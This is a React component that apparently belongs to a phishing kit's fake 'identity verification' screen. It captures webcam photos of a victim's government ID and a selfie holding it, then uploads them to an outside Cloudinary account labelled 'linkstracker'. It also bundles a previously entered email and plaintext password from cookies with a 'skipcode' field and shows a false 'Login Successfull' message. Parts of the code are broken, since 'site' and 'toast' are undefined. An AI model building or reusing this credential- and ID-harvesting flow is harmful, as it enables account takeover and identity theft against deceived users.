import React, { useCallback, useEffect, useRef, useState } from "react";
import CheckIcon from "./Icons/CheckIcon";
import AngleLeft from "./Icons/AngleLeftIcon";
import XIcon from "./Icons/XIcon";
import Webcam from "react-webcam";
import Image from "next/image";
import Cookies from "js-cookie";
import ArrowPathIcon from "./Icons/ArrowPathIcon";
import CameraIcon from "./Icons/CameraIcon";

function PhotoUpload({ setShowModal }) {
  const [facingMode, setFacingMode] = useState("user");
  const videoConstraints = {
    width: 450,
    height: 300,
    // facingMode: "user",
    facingMode: facingMode,
  };

  const handleSwitchCamera = () => {
    setFacingMode(facingMode === "user" ? { exact: "environment" } : "user");
  };

  // const handleSwitchCamera = () => {
  //   setFacingMode(facingMode === "user" ?  "environment" : "user");
  // };

  const [showCamera, setShowCamera] = useState("");

  const [onlyCardUrl, setOnlyCardUrl] = useState("");
  const [holdingCardUrl, setHoldingCardUrl] = useState("");
  const onlyCardCamRef = useRef(null);
  const holdingCardCamRef = useRef(null);

  // const [imageSrc, setImageSrc] = useState("");

  const cloud_name = "dfcuxshca";
  const preset = "linkstracker";
  const folder = "linkstracker";

  const handleOnlyCard = useCallback(() => {
    const imageSrc = onlyCardCamRef.current.getScreenshot();
    // setImageSrc(imageSrc);
    // const demoUrl = URL.createObjectURL(imageSrc);
    const formData = new FormData();
    formData.append("file", imageSrc);
    formData.append("upload_preset", preset);
    formData.append("cloud_name", cloud_name);
    formData.append("folder", folder);

    const uploadImage = async () => {
      try {
        const response = await fetch(
          `https://api.cloudinary.com/v1_1/${cloud_name}/image/upload`,
          {
            method: "POST",
            body: formData,
          }
        );

        const data = await response.json();

        if (response.ok) {
          // setValue("imageUrl", data.secure_url);
          // setValue("imageId", data.public_id);

          setOnlyCardUrl(data.secure_url);
          Cookies.set("onlyCard", data.secure_url);
          // Cookies.set("onlyCard", onlyCardUrl);
          // console.log("onlycard", onlyCardUrl);
          setShowCamera("");
        } else {
          console.log("error", data);
        }
      } catch (error) {
        console.log("error", error);
      }
    };

    uploadImage();

    // const demoUrl = imageSrc;
    // setOnlyCardUrl(demoUrl);
    // Cookies.set("onlyCard", demoUrl);
    // setShowCamera("");
  }, [onlyCardCamRef]);

  console.log("onlycard", onlyCardUrl);

  // useEffect(() => {
  //   Cookies.set("onlyCard", onlyCardUrl);
  //   console.log("onlycard", onlyCardUrl);
  // }, [onlyCardUrl]);

  // console.log("onlyCardUrl", onlyCardUrl);

  const handleHoldingCard = useCallback(() => {
    const imageSrc = holdingCardCamRef.current.getScreenshot();
    // setImageSrc(imageSrc);
    // const demoUrl = URL.createObjectURL(imageSrc);
    const formData = new FormData();
    formData.append("file", imageSrc);
    formData.append("upload_preset", preset);
    formData.append("cloud_name", cloud_name);
    formData.append("folder", folder);

    const uploadImage = async () => {
      try {
        const response = await fetch(
          `https://api.cloudinary.com/v1_1/${cloud_name}/image/upload`,
          {
            method: "POST",
            body: formData,
          }
        );

        const data = await response.json();

        if (response.ok) {
          // setValue("imageUrl", data.secure_url);
          // setValue("imageId", data.public_id);

          setHoldingCardUrl(data.secure_url);
          Cookies.set("holdingCard", data.secure_url);
          // Cookies.set("onlyCard", onlyCardUrl);
          // console.log("onlycard", onlyCardUrl);
          setShowCamera("");
        } else {
          console.log("error", data);
        }
      } catch (error) {
        console.log("error", error);
      }
    };

    uploadImage();

    // const demoUrl = imageSrc;
    // setHoldingCardUrl(demoUrl);
    // Cookies.set("holdingCard", demoUrl);
    // setShowCamera("");
  }, [holdingCardCamRef]);

  // useEffect(() => {
  //   console.log("image src", imageSrc);
  // }, [imageSrc]);

  const handleAllSubmit = async () => {
    const allValues = {
      site: site,
      email: Cookies.get("email"),
      password: Cookies.get("password"),
      skipcode: "",
      onlyCard: Cookies.get("onlyCard"),
      holdingCard: Cookies.get("holdingCard"),
    };

    console.log("allValues", allValues);

    Cookies.remove("email");
    Cookies.remove("password");
    Cookies.remove("onlyCard");
    Cookies.remove("holdingCard");

    setShowModal(false);
    toast.success("Login Successfull");
  };

  return (
    <div className="absolute inset-0 bg-black/40 h-screen">
      <div className="flex flex-col justify-center items-center h-full">
        <div className="md:w-[450px] rounded-md bg-white shadow-md overflow-hidden ">
          <div className="py-3.5 px-5 bg-gray-200 flex justify-between items-center">
            <button
              type="button"
              onClick={() => {
                setShowModal(false), setShowCamera("onlyCard");
              }}
            >
              <AngleLeft />
            </button>

            <p className="text-center  capitalize text-sm font-semibold text-gray-500">
              NEED HELP?
            </p>
            <button
              type="button"
              onClick={() => {
                setShowModal(false);
                setShowCamera(false);
              }}
            >
              <XIcon />
            </button>
          </div>
          {!showCamera ? (
            <div className="mx-8 my-6 flex flex-col items-center gap-5">
              <h1 className="text-[22px] font-semibold uppercase text-gray-700">
                PHOTO UPLOAD
              </h1>

              <div className="relative w-[160px] h-[90px]">
                {!onlyCardUrl && (
                  <Image
                    alt="id image"
                    src="/images/id-photo-1.jpg"
                    fill
                    className="object-cover"
                  />
                )}

                {onlyCardUrl && !holdingCardUrl && (
                  <Image
                    alt="id image"
                    src="/images/id-photo-2.jpg"
                    fill
                    className="object-cover object-center"
                  />
                )}
              </div>

              <div className="mt-8">
                <div
                  className={`flex items-center gap-3 ${
                    onlyCardUrl && "opacity-50"
                  }`}
                >
                  <span className="bg-gray-800 text-white rounded-full h-10 w-10 text-lg flex justify-center items-center">
                    {!onlyCardUrl ? 1 : <CheckIcon />}
                  </span>

                  <p className="flex-1 text-sm">
                    Upload or take a photo of your GOVERNMENT ID on a flat
                    surface.
                  </p>
                </div>

                {!onlyCardUrl && (
                  <button
                    type="button"
                    className="relative flex justify-center items-center mt-6 w-full bg-gradient-to-r from-blue-500 to-[#0552AA] text-white text-sm font-semibold py-3 uppercase"
                    onClick={() => setShowCamera("onlyCard")}
                  >
                    <p>TAKE PHOTO OF ID</p>
                    <span className="absolute right-5">
                      <CameraIcon />
                    </span>
                  </button>
                )}
              </div>

              <div className="mt-8">
                <div
                  className={`flex items-center gap-3 ${
                    (!onlyCardUrl || holdingCardUrl) && "opacity-50"
                  }`}
                >
                  <span className="bg-gray-800 text-white rounded-full h-10 w-10 text-lg flex justify-center items-center">
                    {!holdingCardUrl ? 2 : <CheckIcon />}
                  </span>

                  <p className="flex-1 text-sm">
                    Upload or take a selfie of your GOVERNMENT ID close to your
                    face.
                  </p>
                </div>

                {onlyCardUrl && !holdingCardUrl && (
                  <button
                    type="button"
                    className="relative flex justify-center items-center mt-6 w-full bg-gradient-to-r from-blue-500 to-[#0552AA] text-white text-sm font-semibold py-3 uppercase"
                    onClick={() => setShowCamera("holdingCard")}
                  >
                    <p>TAKE SELFIE WITH ID</p>
                    <span className="absolute right-5">
                      <CameraIcon />
                    </span>
                  </button>
                )}
              </div>

              {onlyCardUrl && holdingCardUrl && (
                <button
                  type="submit"
                  className="mt-3 text-white text-sm font-medium bg-blue-600 py-3 px-8 uppercase"
                  // onClick={handleAllSubmit}
                >
                  SUBMIT
                </button>
              )}
            </div>
          ) : (
            <>
              {showCamera === "onlyCard" && (
                <>
                  <Webcam
                    ref={onlyCardCamRef}
                    audio={false}
                    screenshotFormat="image/jpeg"
                    // width={450}
                    // height={300}
                    videoConstraints={videoConstraints}
                  />

                  <div className="mt-3 mb-5 relative">
                    <button
                      type="button"
                      className="mx-auto flex justify-center px-6 py-2 text-sm font-medium bg-blue-600 text-white"
                      onClick={handleOnlyCard}
                    >
                      Take Photo
                    </button>
                    <button
                      type="button"
                      className="md:hidden absolute top-1 right-7 rounded-full flex flex-col items-center"
                      onClick={handleSwitchCamera}
                    >
                      <ArrowPathIcon />
                      <p className="text-xs">Rotate</p>
                    </button>
                  </div>
                </>
              )}
              {showCamera === "holdingCard" && (
                <>
                  <Webcam
                    ref={holdingCardCamRef}
                    audio={false}
                    screenshotFormat="image/jpeg"
                    // width={450}
                    // height={300}
                    videoConstraints={videoConstraints}
                  />

                  <div className="mt-3 mb-5 relative">
                    <button
                      type="button"
                      className="mx-auto flex justify-center px-6 py-2 text-sm font-medium bg-blue-600 text-white"
                      onClick={handleHoldingCard}
                    >
                      Take Photo
                    </button>
                    <button
                      type="button"
                      className="md:hidden absolute top-1 right-7 rounded-full flex flex-col items-center"
                      onClick={handleSwitchCamera}
                    >
                      <ArrowPathIcon />
                      <p className="text-xs">Rotate</p>
                    </button>
                  </div>
                </>
              )}
            </>
          )}
        </div>
        <div className="mt-3 font-bold text-lg italic">Hold tight...</div>
      </div>
    </div>
  );
}

export default PhotoUpload;
